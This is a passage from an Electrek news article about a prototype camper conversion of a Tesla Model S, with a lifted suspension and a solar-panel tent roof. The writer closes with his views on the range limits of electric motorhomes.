\nHe hasn\u2019t released many details about the prototype yet, but several modifications are visible from the renders. \nFirst off, it\u2019s obvious that the backend has been completely modified to fit a camper box, which can open into a tent with the roof made of a large solar panel. \nThe suspension has also been lifted significantly. \nThose modifications are going to negatively affect the aerodynamic performance of the Model S, which contributes significantly to the efficiency and range of the vehicle, but Rabenberg seems to believe he can still get a range of 200 miles. \nIt will be unveiled at Michigan Energy Office\u2019s EV ride and drive on April 17. \nElectrek\u2019s Take \nAs I have often stated in the past, I\u2019m excited about the prospect of all-electric motorhomes. The idea of moving your home around with zero-emissions without using gas is very appealing. \nIt is especially appealing when you talk about adding solar power into the mix and parking your electric motorhome somewhere for a few days and charge using solar. \nBut the problem with RVs is that they are not aerodynamic, which affects efficiency at highway speeds. It takes more energy to go further and we have so far not seen any concept with much more than 100 miles of range, which is simply not enough. \nYou want a full day of driving worth of range since these vehicles are used to cover significant distances. \nIt would be interesting to see where a Tesla Model S-based camper stands on that front, but we would need something like a Tesla electric motorhome based on Tesla Semi to get a truly useful full-size electric motorhome. \nI think we are going to see the space being seriously electrified in the next few years. \n.
